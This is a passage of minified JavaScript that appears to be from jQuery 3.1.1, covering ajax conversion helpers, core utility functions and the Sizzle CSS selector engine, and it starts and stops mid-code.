l=s(t,n,r);return"string"!=typeof l||a||i[l]?a?!(u=l):void 0:(t.dataTypes.unshift(l),o(l),!1)}),u}var i={},a=e===Rt;return o(t.dataTypes[0])||!i["*"]&&o("*")}function Q(e,t){var n,r,o=me.ajaxSettings.flatOptions||{};for(n in t)void 0!==t[n]&&((o[n]?e:r||(r={}))[n]=t[n]);return r&&me.extend(!0,e,r),e}function J(e,t,n){for(var r,o,i,a,s=e.contents,u=e.dataTypes;"*"===u[0];)u.shift(),void 0===r&&(r=e.mimeType||t.getResponseHeader("Content-Type"));if(r)for(o in s)if(s[o]&&s[o].test(r)){u.unshift(o);break}if(u[0]in n)i=u[0];else{for(o in n){if(!u[0]||e.converters[o+" "+u[0]]){i=o;break}a||(a=o)}i=i||a}if(i)return i!==u[0]&&u.unshift(i),n[i]}function Z(e,t,n,r){var o,i,a,s,u,l={},c=e.dataTypes.slice();if(c[1])for(a in e.converters)l[a.toLowerCase()]=e.converters[a];for(i=c.shift();i;)if(e.responseFields[i]&&(n[e.responseFields[i]]=t),!u&&r&&e.dataFilter&&(t=e.dataFilter(t,e.dataType)),u=i,i=c.shift())if("*"===i)i=u;else if("*"!==u&&u!==i){if(a=l[u+" "+i]||l["* "+i],!a)for(o in l)if(s=o.split(" "),s[1]===i&&(a=l[u+" "+s[0]]||l["* "+s[0]])){a===!0?a=l[o]:l[o]!==!0&&(i=s[0],c.unshift(s[1]));break}if(a!==!0)if(a&&e.throws)t=a(t);else try{t=a(t)}catch(e){return{state:"parsererror",error:a?e:"No conversion from "+u+" to "+i}}}return{state:"success",data:t}}function ee(e){return me.isWindow(e)?e:9===e.nodeType&&e.defaultView}var te=[],ne=t.document,re=Object.getPrototypeOf,oe=te.slice,ie=te.concat,ae=te.push,se=te.indexOf,ue={},le=ue.toString,ce=ue.hasOwnProperty,fe=ce.toString,de=fe.call(Object),pe={},he="3.1.1",me=function(e,t){return new me.fn.init(e,t)},ve=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,ge=/^-ms-/,ye=/-([a-z])/g,xe=function(e,t){return t.toUpperCase()};me.fn=me.prototype={jquery:he,constructor:me,length:0,toArray:function(){return oe.call(this)},get:function(e){return null==e?oe.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=me.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return me.each(this,e)},map:function(e){return this.pushStack(me.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(oe.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(n>=0&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:ae,sort:te.sort,splice:te.splice},me.extend=me.fn.extend=function(){var e,t,n,r,o,i,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for("boolean"==typeof a&&(l=a,a=arguments[s]||{},s++),"object"==typeof a||me.isFunction(a)||(a={}),s===u&&(a=this,s--);s<u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],r=e[t],a!==r&&(l&&r&&(me.isPlainObject(r)||(o=me.isArray(r)))?(o?(o=!1,i=n&&me.isArray(n)?n:[]):i=n&&me.isPlainObject(n)?n:{},a[t]=me.extend(l,i,r)):void 0!==r&&(a[t]=r));return a},me.extend({expando:"jQuery"+(he+Math.random()).replace(/\D/g,""),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isFunction:function(e){return"function"===me.type(e)},isArray:Array.isArray,isWindow:function(e){return null!=e&&e===e.window},isNumeric:function(e){var t=me.type(e);return("number"===t||"string"===t)&&!isNaN(e-parseFloat(e))},isPlainObject:function(e){var t,n;return!(!e||"[object Object]"!==le.call(e))&&(!(t=re(e))||(n=ce.call(t,"constructor")&&t.constructor,"function"==typeof n&&fe.call(n)===de))},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},type:function(e){return null==e?e+"":"object"==typeof e||"function"==typeof e?ue[le.call(e)]||"object":typeof e},globalEval:function(e){r(e)},camelCase:function(e){return e.replace(ge,"ms-").replace(ye,xe)},nodeName:function(e,t){return e.nodeName&&e.nodeName.toLowerCase()===t.toLowerCase()},each:function(e,t){var n,r=0;if(o(e))for(n=e.length;r<n&&t.call(e[r],r,e[r])!==!1;r++);else for(r in e)if(t.call(e[r],r,e[r])===!1)break;return e},trim:function(e){return null==e?"":(e+"").replace(ve,"")},makeArray:function(e,t){var n=t||[];return null!=e&&(o(Object(e))?me.merge(n,"string"==typeof e?[e]:e):ae.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:se.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,o=e.length;r<n;r++)e[o++]=t[r];return e.length=o,e},grep:function(e,t,n){for(var r,o=[],i=0,a=e.length,s=!n;i<a;i++)r=!t(e[i],i),r!==s&&o.push(e[i]);return o},map:function(e,t,n){var r,i,a=0,s=[];if(o(e))for(r=e.length;a<r;a++)i=t(e[a],a,n),null!=i&&s.push(i);else for(a in e)i=t(e[a],a,n),null!=i&&s.push(i);return ie.apply([],s)},guid:1,proxy:function(e,t){var n,r,o;if("string"==typeof t&&(n=e[t],t=e,e=n),me.isFunction(e))return r=oe.call(arguments,2),o=function(){return e.apply(t||this,r.concat(oe.call(arguments)))},o.guid=e.guid=e.guid||me.guid++,o},now:Date.now,support:pe}),"function"==typeof Symbol&&(me.fn[Symbol.iterator]=te[Symbol.iterator]),me.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "),function(e,t){ue["[object "+t+"]"]=t.toLowerCase()});var be=function(e){function t(e,t,n,r){var o,i,a,s,u,l,c,d=t&&t.ownerDocument,h=t?t.nodeType:9;if(n=n||[],"string"!=typeof e||!e||1!==h&&9!==h&&11!==h)return n;if(!r&&((t?t.ownerDocument||t:W)!==q&&O(t),t=t||q,L)){if(11!==h&&(u=ge.exec(e)))if(o=u[1]){if(9===h){if(!(a=t.getElementById(o)))return n;if(a.id===o)return n.push(a),n}else if(d&&(a=d.getElementById(o))&&R(t,a)&&a.id===o)return n.push(a),n}else{if(u[2])return J.apply(n,t.getElementsByTagName(e)),n;if((o=u[3])&&T.getElementsByClassName&&t.getElementsByClassName)return J.apply(n,t.getElementsByClassName(o)),n}if(T.qsa&&!U[e+" "]&&(!P||!P.test(e))){if(1!==h)d=t,c=e;else if("object"!==t.nodeName.toLowerCase()){for((s=t.getAttribute("id"))?s=s.replace(we,Te):t.setAttribute("id",s=I),l=j(e),i=l.length;i--;)l[i]="#"+s+" "+p(l[i]);c=l.join(","),d=ye.test(e)&&f(t.parentNode)||t}if(c)try{return J.apply(n,d.querySelectorAll(c)),n}catch(e){}finally{s===I&&t.removeAttribute("id")}}}return k(e.replace(se,"$1"),t,n,r)}function n(){function e(n,r){return t.push(n+" ")>_.cacheLength&&delete e[t.shift()],e[n+" "]=r}var t=[];return e}function r(e){return e[I]=!0,e}function o(e){var t=q.createElement("fieldset");try{return!!e(t)}catch(e){return!1}finally{t.parentNode&&t.parentNode.removeChild(t),t=null}}function i(e,t){for(var n=e.split("|"),r=n.length;r--;)_.attrHandle[n[r]]=t}function a(e,t){var n=t&&e,r=n&&1===e.nodeType&&1===t.nodeType&&e.sourceIndex-t.sourceIndex;if(r)return r;if(n)for(;n=n.nextSibling;)if(n===t)return-1;return e?1:-1}function s(e){return function(t){var n=t.nodeName.toLowerCase();return"input"===n&&t.type===e}}function u(e){return function(t){var n=t.nodeName.toLowerCase();return("input"===n||"button"===n)&&t.type===e}}function l(e){return function(t){return"form"in t?t.parentNode&&t.disabled===!1?"label"in t?"label"in t.parentNode?t.parentNode.disabled===e:t.disabled===e:t.isDisabled===e||t.isDisabled!==!e&&Ce(t)===e:t.disabled===e:"label"in t&&t.disabled===e}}function c(e){return r(function(t){return t=+t,r(function(n,r){for(var o,i=e([],n.length,t),a=i.length;a--;)n[o=i[a]]&&(n[o]=!(r[o]=n[o]))})})}function f(e){return e&&"undefined"!=typeof e.getElementsByTagName&&e}function d(){}function p(e){for(var t=0,n=e.length,r="";t<n;t++)r+=e[t].value;return r}function h(e,t,n){var r=t.dir,o=t.next,i=o||r,a=n&&"parentNode"===i,s=z++;return t.first?function(t,n,o){for(;t=t[r];)if(1===t.nodeType||a)return e(t,n,o);return!1}:function(t,n,u){var l,c,f,d=[$,s];if(u){for(;t=t[r];)if((1===t.nodeType||a)&&e(t,n,u))return!0}else for(;t=t[r];)if(1===t.nodeType||a)if(f=t[I]||(t[I]={}),c=f[t.uniqueID]||(f[t.uniqueID]={}),o&&o===t.nodeName.toLowerCase())t=t[r]||t;else{if((l=c[i])&&l[0]===$&&l[1]===s)return d[2]=l[2];if(c[i]=d,d[2]=e(t,n,u))return!0}return!1}}function m(e){return e.length>1?function(t,n,r){for(var o=e.length;o--;)if(!e[o](t,n,r))return!1;return!0}:e[0]}function v(e,n,r){for(var o=0,i=n.length;o<i;o++)t(e,n[o],r);return r}function g(e,t,n,r,o){for(var i,a=[],s=0,u=e.length,l=null!=t;s<u;s++)(i=e[s])&&(n&&!n(i,r,o)||(a.push(i),l&&t.push(s)));return a}function y(e,t,n,o,i,a){return o&&!o[I]&&(o=y(o)),i&&!i[I]&&(i=y(i,a)),r(function(r,a,s,u){var l,c,f,d=[],p=[],h=a.length,m=r||v(t||"*",s.nodeType?[s]:s,[]),y=!e||!r&&t?m:g(m,d,e,s,u),x=n?i||(r?e:h||o)?[]:a:y;if(n&&n(y,x,s,u),o)for(l=g(x,p),o(l,[],s,u),c=l.length;c--;)(f=l[c])&&(x[p[c]]=!(y[p[c]]=f));if(r){if(i||e){if(i){for(l=[],c=x.length;c--;)(f=x[c])&&l.push(y[c]=f);i(null,x=[],l,u)}for(c=x.length;c--;)(f=x[c])&&(l=i?ee(r,f):d[c])>-1&&(r[l]=!(a[l]=f))}}else x=g(x===a?x.splice(h,x.length):x),i?i(null,a,x,u):J.apply(a,x)})}function x(e){for(var t,n,r,o=e.length,i=_.relative[e[0].type],a=i||_.relative[" "],s=i?1:0,u=h(function(e){return e===t},a,!0),l=h(function(e){return ee(t,e)>-1},a,!0),c=[function(e,n,r){var o=!i&&(r||n!==N)||((t=n).nodeType?u(e,n,r):l(e,n,r));return t=null,o}];s<o;s++)if(n=_.relative[e[s].type])c=[h(m(c),n)];else{if(n=_.filter[e[s].type].apply(null,e[s].matches),n[I]){for(r=++s;r<o&&!_.relative[e[r].type];r++);return y(s>1&&m(c),s>1&&p(e.slice(0,s-1).concat({value:" "===e[s-2].type?"*":""})).replace(se,"$1"),n,s<r&&x(e.slice(s,r)),r<o&&x(e=e.slice(r)),r<o&&p(e))}c.push(n)}return m(c)}function b(e,n){var o=n.length>0,i=e.length>0,a=function(r,a,s,u,l){var c,f,d,p=0,h="0",m=r&&[],v=[],y=N,x=r||i&&_.find.TAG("*",l),b=$+=null==y?1:Math.random()||.1,w=x.length;for(l&&(N=a===q||a||l);h!==w&&null!=(c=x[h]);h++){if(i&&c){for(f=0,a||c.ownerDocument===q||(O(c),s=!L);d=e[f++];)if(d(c,a||q,s)){u.push(c);break}l&&($=b)}o&&((c=!d&&c)&&p--,r&&m.push(c))}if(p+=h,o&&h!==p){for(f=0;d=n[f++];)d(m,v,a,s);if(r){if(p>0)for(;h--;)m[h]||v[h]||(v[h]=K.call(u));v=g(v)}J.apply(u,v),l&&!r&&v.length>0&&p+n.length>1&&t.uniqueSort(u)}return l&&($=b,N=y),m};return o?r(a):a}var w,T,_,C,S,j,E,k,N,D,A,O,q,M,L,P,F,H,R,I="sizzle"+1*new Date,W=e.document,$=0,z=0,B=n(),G=n(),U=n(),V=function(e,t){return e===t&&(A=!0),0},X={}.hasOwnProperty,Y=[],K=Y.pop,Q=Y.push,J=Y.push,Z=Y.slice,ee=function(e,t){for(var n=0,r=e.length;n<r;n++)if(e[n]===t)return n;return-1},te="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",ne="[\\x20\\t\\r\\n\\f]",re="(?:\\\\.|[\\w-]|[^\0-\\xa0])+",oe="\\["+ne+"*("+re+")(?:"+ne+"*([*^$|!~]?=)"+ne+"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|("+re+"))|)"+ne+"*\\]",ie=":("+re+")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|"+oe+")*)|.*)\\)|)",ae=new RegExp(ne+"+","g"),se=new RegExp("^"+ne+"+|((?:^|[^\\\\])(?:\\\\.)*)"+ne+"+$","g"),ue=new RegExp("^"+ne+"*,"+ne+"*"),le=new RegExp("^"+ne+"*([>+~]|"+ne+")"+ne+"*"),ce=new RegExp("="+ne+"*([^\\]'\"]*?)"+ne+"*\\]","g"),fe=new RegExp(ie),de=new RegExp("^"+re+"$"),pe={ID:new RegExp("^#("+re+")"),CLASS:new RegExp("^\\.("+re+")"),TAG:new RegExp("^("+re+"|[*])"),ATTR:new RegExp("^"+oe),PSEUDO:new RegExp("^"+ie),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+ne+"*(even|odd|(([+-]|)(\\d*)n|)"+ne+"*(?:([+-]|)"+ne+"*(\\d+)|))"+ne+"*\\)|)","i"),bool:new RegExp("^(?:"+te+")$","i"),needsContext:new RegExp("^"+ne+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+ne+"*((?:-\\d)?\\d*)"+ne+"*\\)|)(?=[^-]|$)","i")},he=/^(?:input|select|textarea|button)$/i,me=/^h\d$/i,ve=/^[^{]+\{\s*\[native \w/,ge=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,ye=/[+~]/,xe=new RegExp("\\\\([\\da-f]{1,6}"+ne+"?|("+ne+")|.)","ig"),be=function(e,t,n){var r="0x"+t-65536;return r!==r||n?t:r<0?String.fromCharCode(r+65536):String.fromCharCode(r>>10|55296,1023&r|56320)},we=/([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,Te=function(e,t){return t?"\0"===e?"�":e.slice(0,-1)+"\\"+e.charCodeAt(e.length-1).toString(16)+" ":"\\"+e},_e=function(){O()},Ce=h(function(e){return e.disabled===!0&&("form"in e||"label"in e)},{dir:"parentNode",next:"legend"});try{J.apply(Y=Z.call(W.childNodes),W.childNodes),Y[W.childNodes.length].nodeType}catch(e){J={apply:Y.length?function(e,t){Q.apply(e,Z.call(t))}:function(e,t){for(var n=e.length,r=0;e[n++]=t[r++];);e.length=n-1}}}T=t.support={},S=t.isXML=function(e){var t=e&&(e.ownerDocument||e).documentElement;return!!t&&"HTML"!==t.nodeName},O=t.setDocument=function(e){var t,n,r=e?e.ownerDocument||e:W;return r!==q&&9===r.nodeType&&r.documentElement?(q=r,M=q.documentElement,L=!S(q),W!==q&&(n=q.defaultView)&&n.top!==n&&(n.addEventListener?n.addEventListener("unload",_e,!1):n.attachEvent&&n.attachEvent("onunload",_e)),T.attributes=o(function(e){return e.className="i",!e.getAttribute("className")}),T.getElementsByTagName=o(function(e){return e.appendChild(q.createComment("")),!e.getElementsByTagName("*").length}),T.getElementsByClassName=ve.test(q.getElementsByClassName),T.getById=o(function(e){return M.appendChild(e).id=I,!q.getElementsByName||!q.getElementsByName(I).length}),T.getById?(_.filter.ID=function(e){var t=e.replace(xe,be);return function(e){return e.getAttribute("id")===t}},_.find.ID=function(e,t){if("undefined"!=typeof t.getElementById&&L){var n=t.getElementById(e);return n?[n]:[]}}):(_.filter.ID=function(e){var t=e.replace(xe,be);return function(e){var n="undefined"!=typeof e.getAttributeNode&&e.getAttributeNode("id");return n&&n.value===t}},_.find.ID=function(e,t){if("undefined"!=typeof t.getElementById&&L){var n,r,o,i=t.getElementById(e);if(i){if(n=i.getAttributeNode("id"),n&&n.value===e)return[i];for(o=t.getElementsByName(e),r=0;i=o[r++];)if(n=i.getAttributeNode("id"),n&&n.value===e)return[i]}return[]}}),_.find.TAG=T.getElementsByTagName?function(e,t){return"undefined"!=typeof t.getElementsByTagName?t.getElementsByTagName(e):T.qsa?t.querySelectorAll(e):void 0}:function(e,t){var n,r=[],o=0,i=t.getElementsByTagName(e);if("*"===e){for(;n=i[o++];)1===n.nodeType&&r.push(n);return r}return i},_.find.CLASS=T.getElementsByClassName&&function(e,t){if("undefined"!=typeof t.getElementsByClassName&&L)return t.getElementsByClassName(e)},F=[],P=[],(T.qsa=ve.test(q.querySelectorAll))&&(o(function(e){M.appendChild(e).innerHTML="<a id='"+I+"'></a><select id='"+I+"-\r\\' msallowcapture=''><option selected=''></option></select>",e.querySelectorAll("[msallowcapture^='']").length&&P.push("[*^$]="+ne+"*(?:''|\"\")"),e.querySelectorAll("[selected]").length||P.push("\\["+ne+"*(?:value|"+te+")"),e.querySelectorAll("[id~="+I+"-]").length||P.push("~="),e.querySelectorAll(":checked").length||P.push(":checked"),e.querySelectorAll("a#"+I+"+*").length||P.push(".#.+[+~]")}),o(function(e){e.innerHTML="<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";var t=q.createElement("input");t.setAttribute("type","hidden"),e.appendChild(t).setAttribute("name","D"),e.querySelectorAll("[name=d]").length&&P.push("name"+ne+"*[*^$|!~]?="),2!==e.querySelectorAll(":enabled").length&&P.push(":enabled",":disabled"),M.appendChild(e).disabled=!0,2!==e.querySelectorAll(":disabled").length&&P.push(":enabled",":disabled"),e.querySelectorAll("*,:x"),P.push(",.*:")})),(T.matchesSelector=ve.test(H=M.matches||M.webkitMatchesSelector||M.mozMatchesSelector||M.oMatchesSelector||M.msMatchesSelector))&&o(function(e){T.disconnectedMatch=H.call(e,"*"),H.call(e,"[s!='']:x"),F.push("!=",ie)}),P=P.length&&new RegExp(P.join("|")),F=F.length&&new RegExp(F.join("|")),t=ve.test(M.compareDocumentPosition),R=t||ve.test(M.contains)?function(e,t){var n=9===e.nodeType?e.documentElement:e,r=t&&t.parentNode;return e===r||!(!r||1!==r.nodeType||!(n.contains?n.contains(r):e.compareDocumentPosition&&16&e.compareDocumentPosition(r)))}:function(e,t){if(t)for(;t=t.parentNode;)if(t===e)return!0;return!1},V=t?function(e,t){if(e===t)return A=!0,0;var n=!e.compareDocumentPosition-!t.compareDocumentPosition;return n?n:(n=(e.ownerDocument||e)===(t.ownerDocument||t)?e.compareDocumentPosition(t):1,1&n||!T.sortDetached&&t.compareDocumentPosition(e)===n?e===q||e.ownerDocument===W&&R(W,e)?-1:t===q||t.ownerDocument===W&&R(W,t)?1:D?ee(D,e)-ee(D,t):0:4&n?-1:1)}:function(e,t){if(e===t)return A=!0,0;var n,r=0,o=e.parentNode,i=t.parentNode,s=[e],u=[t];if(!o||!i)return e===q?-1:t===q?1:o?-1:i?1:D?ee(D,e)-ee(D,t):0;if(o===i)return a(e,t);for(n=e;n=n.parentNode;)s.unshift(n);for(n=t;n=n.parentNode;)u.unshift(n);for(;s[r]===u[r];)r++;return r?a(s[r],u[r]):s[r]===W?-1:u[r]===W?1:0},q):q},t.matches=function(e,n){return t(e,null,null,n)},t.matchesSelector=function(e,n){if((e.ownerDocument||e)!==q&&O(e),n=n.replace(ce,"='$1']"),T.matchesSelector&&L&&!U[n+" "]&&(!F||!F.test(n))&&(!P||!P.test(n)))try{var r=H.call(e,n);if(r||T.disconnectedMatch||e.document&&11!==e.document.nodeType)return r}catch(e){}return t(n,q,null,[e]).length>0},t.contains=function(e,t){return(e.ownerDocument||e)!==q&&O(e),R(e,t)},t.attr=function(e,t){(e.ownerDocument||e)!==q&&O(e);var n=_.attrHandle[t.toLowerCase()],r=n&&X.call(_.attrHandle,t.toLowerCase())?n(e,t,!L):void 0;return void 0!==r?r:T.attributes||!L?e.getAttribute(t):(r=e.getAttributeNode(t))&&r.specified?r.value:null},t.escape=function(e){return(e+"").replace(we,Te)},t.error=function(e){throw new Error("Syntax error, unrecognized expression: "+e)},t.uniqueSort=function(e){var t,n=[],r=0,o=0;if(A=!T.detectDuplicates,D=!T.sortStable&&e.slice(0),e.sort(V),A){for(;t=e[o++];)t===e[o]&&(r=n.push(o));for(;r--;)e.splice(n[r],1)}return D=null,e},C=t.getText=function(e){var t,n="",r=0,o=e.nodeType;if(o){if(1===o||9===o||11===o){if("string"==typeof e.textContent)return e.textContent;for(e=e.firstChild;e;e=e.nextSibling)n+=C(e)}else if(3===o||4===o)return e.nodeValue}else for(;t=e[r++];)n+=C(t);return n},_=t.selectors={cacheLength:50,createPseudo:r,match:pe,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(e){return e[1]=e[1].replace(xe,be),e[3]=(e[3]||e[4]||e[5]||"").replace(xe,be),"~="===e[2]&&(e[3]=" "+e[3]+" "),e.slice(0,4)},CHILD:function(e){return e[1]=e[1].toLowerCase(),"nth"===e[1].slice(0,3)?(e[3]||t.error(e[0]),e[4]=+(e[4]?e[5]+(e[6]||1):2*("even"===e[3]||"odd"===e[3])),e[5]=+(e[7]+e[8]||"odd"===e[3])):e[3]&&t.error(e[0]),e},PSEUDO:function(e){var t,n=!e[6]&&e[2];return pe.CHILD.test(e[0])?null:(e[3]?e[2]=e[4]||e[5]||"":n&&fe.test(n)&&(t=j(n,!0))&&(t=n.indexOf(")",n.length-t)-n.length)&&(e[0]=e[0].slice(0,t),e[2]=n.slice(0,t)),e.slice(0,3))}},filter:{TAG:function(e){var t=e.replace(xe,be).toLowerCase();return"*"===e?function(){return!0}:function(e){return e.nodeName&&e.nodeName.toLowerCase()===t}},CLASS:function(e){var t=B[e+" "];return t||(t=new RegExp("(^|"+ne+")"+e+"("+ne+"|$)"))&&B(e,function(e){return t.test("string"==typeof e.className&&e.className||"undefined"!=typeof e.getAttribute&&e.getAttribute("class")||"")})},ATTR:function(e,n,r){return function(o){var i=t.attr(o,e);return null==i?"!="===n:!n||(i+="","="===n?i===r:"!="===n?i!==r:"^="===n?r&&0===i.indexOf(r):"*="===n?r&&i.indexOf(r)>-1:"$="===n?r&&i.slice(-r.length)===r:"~="===n?(" "+i.replace(ae," ")+" ").indexOf(r)>-1:"|="===n&&(i===r||i.slice(0,r.length+1)===r+"-"))}},CHILD:function(e,t,n,r,o){var i="nth"!==e.slice(0,3),a="last"!==e.slice(-4),s="of-type"===t;return 1===r&&0===o?function(e){return!!e.parentNode}:function(t,n,u){var l,c,f,d,p,h,m=i!==a?"nextSibling":"previousSibling",v=t.parentNode,g=s&&t.nodeName.toLowerCase(),y=!u&&!s,x=!1;if(v){if(i){for(;m;){for(d=t;d=d[m];)if(s?d.nodeName.toLowerCase()===g:1===d.nodeType)return!1;h=m="only"===e&&!h&&"nextSibling"}return!0}if(h=[a?v.firstChild:v.lastChild],a&&y){for(d=v,f=d[I]||(d[I]={}),c=f[d.uniqueID]||(f[d.uniqueID]={}),l=c[e]||[],p=l[0]===$&&l[1],x=p&&l[2],d=p&&v.childNodes[p];d=++p&&d&&d[m]||(x=p=0)||h.pop();)if(1===d.nodeType&&++x&&d===t){c[e]=[$,p,x];break}}else if(y&&(d=t,f=d[I]||(d[I]={}),c=f[d.uniqueID]||(f[d.uniqueID]={}),l=c[e]||[],p=l[0]===$&&l[1],x=p),x===!1)for(;(d=++p&&d&&d[m]||(x=p=0)||h.pop())&&((s?d.nodeName.toLowerCase()!==g:1!==d.nodeType)||!++x||(y&&(f=d[I]||(d[I]={}),c=f[d.uniqueID]||(f[d.uniqueID]={}),c[e]=[$,x]),d!==t)););return x-=o,x===r||x%r===0&&x/r>=0}}},PSEUDO:function(e,n){var o,i=_.pseudos[e]||_.setFilters[e.toLowerCase()]||t.error("unsupported pseudo: "+e);return i[I]?i(n):i.length>1?(o=[e,e,"",n],_.setFilters.hasOwnProperty(e.toLowerCase())?r(function(e,t){for(var r,o=i(e,n),a=o.length;a--;)r=ee(e,o[a]),e[r]=!(t[r]=o[a]);
}):function(e){return i(e,0,o)}):i}},pseudos:{not:r(function(e){var t=[],n=[],o=E(e.replace(se,"$1"));return o[I]?r(function(e,t,n,r){for(var i,a=o(e,null,r,[]),s=e.length;s--;)(i=a[s])&&(e[s]=!(t[s]=i))}):function(e,r,i){return t[0]=e,o(t,null,i,n),t[0]=null,!n.pop()}}),has:r(function(e){return function(n){return t(e,n).length>0}}),contains:r(function(e){return e=e.replace(xe,be),function(t){return(t.textContent||t.innerText||C(t)).indexOf(e)>-1}}),lang:r(function(e){return de.test(e||"")||t.error("unsupported lang: "+e),e=e.replace(xe,be).toLowerCase(),function(t){var n;do if(n=L?t.lang:t.getAttribute("xml:lang")||t.getAttribute("lang"))return n=n.toLowerCase(),n===e||0===n.indexOf(e+"-");while((t=t.parentNode)&&1===t.nodeType);return!1}}),target:function(t){var n=e.location&&e.location.hash;return n&&n.slice(1)===t.id},root:function(e){return e===M},focus:function(e){return e===q.activeElement&&(!q.hasFocus||q.hasFocus())&&!!(e.type||e.href||~e.tabIndex)},enabled:l(!1),disabled:l(!0),checked:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&!!e.checked||"option"===t&&!!e.selected},selected:function(e){return e.parentNode&&e.parentNode.selectedIndex,e.selected===!0},empty:function(e){for(e=e.firstChild;e;e=e.nextSibling)if(e.nodeType<6)return!1;return!0},parent:function(e){return!_.pseudos.empty(e)},header:function(e){return me.test(e.nodeName)},input:function(e){return he.test(e.nodeName)},button:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&"button"===e.type||"button"===t},text:function(e){var t;return"input"===e.nodeName.toLowerCase()&&"text"===e.type&&(null==(t=e.getAttribute("type"))||"text"===t.toLowerCase())},first:c(function(){return[0]}),last:c(function(e,t){return[t-1]}),eq:c(function(e,t,n){return[n<0?n+t:n]}),even:c(function(e,t){for(var n=0;n<t;n+=2)e.push(n);return e}),odd:c(function(e,t){for(var n=1;n<t;n+=2)e.push(n);return e}),lt:c(function(e,t,n){for(var r=n<0?n+t:n;--r>=0;)e.push(r);return e}),gt:c(function(e,t,n){for(var r=n<0?n+t:n;++r<t;)e.push(r);return e})}},_.pseudos.nth=_.pseudos.eq;for(w in{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})_.pseudos[w]=s(w);for(w in{submit:!0,reset:!0})_.pseudos[w]=u(w);return d.prototype=_.filters=_.pseudos,_.setFilters=new d,j=t.tokenize=function(e,n){var r,o,i,a,s,u,l,c=G[e+" "];if(c)return n?0:c.slice(0);for(s=e,u=[],l=_.preFilter;s;){r&&!(o=ue.exec(s))||(o&&(s=s.slice(o[0].length)||s),u.push(i=[])),r=!1,(o=le.exec(s))&&(r=o.shift(),i.push({value:r,type:o[0].replace(se," ")}),s=s.slice(r.length));for(a in _.filter)!(o=pe[a].exec(s))||l[a]&&!(o=l[a](o))||(r=o.shift(),i.push({value:r,type:a,matches:o}),s=s.slice(r.length));if(!r)break}return n?s.length:s?t.error(e):G(e,u).slice(0)},E=t.compile=function(e,t){var n,r=[],o=[],i=U[e+" "];if(!i){for(t||(t=j(e)),n=t.length;n--;)i=x(t[n]),i[I]?r.push(i):o.push(i);i=U(e,b(o,r)),i.selector=e}return i},k=t.select=function(e,t,n,r){var o,i,a,s,u,l="function"==typeof e&&e,c=!r&&j(e=l.selector||e);if(n=n||[],1===c.length){if(i=c[0]=c[0].slice(0),i.length>2&&"ID"===(a=i[0]).type&&9===t.nodeType&&L&&_.relative[i[1].type]){if(t=(_.find.ID(a.matches[0].replace(xe,be),t)||[])[0],!t)return n;l&&(t=t.parentNode),e=e.slice(i.shift().value.length)}for(o=pe.needsContext.test(e)?0:i.length;o--&&(a=i[o],!_.relative[s=a.type]);)if((u=_.find[s])&&(r=u(a.matches[0].replace(xe,be),ye.test(i[0].type)&&f(t.parentNode)||t))){if(i.splice(o,1),e=r.length&&p(i),!e)return J.apply(n,r),n;break}}return(l||E(e,c))(r,t,!L,n,!t||ye.test(e)&&f(t.parentNode)||t),n},T.sortStable=I.split("").sort(V).join("")===I,T.detectDuplicates=!!A,O(),T.sortDetached=o(function(e){return 1&e.compareDocumentPosition(q.createElement("fieldset"))}),o(function(e){return e.innerHTML="<a href='#'></a>","#"===e.firstChild.getAttribute("href")})||i("type|href|height|width",function(e,t,n){if(!n)return e.getAttribute(t,"type"===t.toLowerCase()?1:2)}),T.attributes&&o(function(e){return e.innerHTML="<input/>",e.firstChild.setAttribute("value",""),""===e.firstChild.getAttribute("value")})||i("value",function(e,t,n){if(!n&&"input"===e.nodeName.toLowerCase())return e.defaultValue}),o(function(e){return null==e.getAttribute("disabled")})||i(te,function(e,t,n){var r;if(!n)return e[t]===!0?t.toLowerCase():(r=e.getAttributeNode(t))&&r.specified?r.value:null}),t}(t);me.find=be,me.expr=be.selectors,me.expr[":"]=me.expr.pseudos,me.uniqueSort=me.unique=be.uniqueSort,me.text=be.getText,me.isXMLDoc=be.isXML,me.contains=be.contains,me.escapeSelector=be.escape;var we=function(e,t,n){for(var r=[],o=void 0!==n;(e=e[t])&&9!==e.nodeType;)if(1===e.nodeType){if(o&&me(e).is(n))break;r.push(e)}return r},Te=function(e,t){for(var n=[];e;e=e.nextSibling)1===e.nodeType&&e!==t&&n.push(e);return n},_e=me.expr.match.needsContext,Ce=/^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i,Se=/^.[^:#\[\.,]*$/;me.filter=function(e,t,n){var r=t[0];return n&&(e=":not("+e+")"),1===t.length&&1===r.nodeType?me.find.matchesSelector(r,e)?[r]:[]:me.find.matches(e,me.grep(t,function(e){return 1===e.nodeType}))},me.fn.extend({find:function(e){var 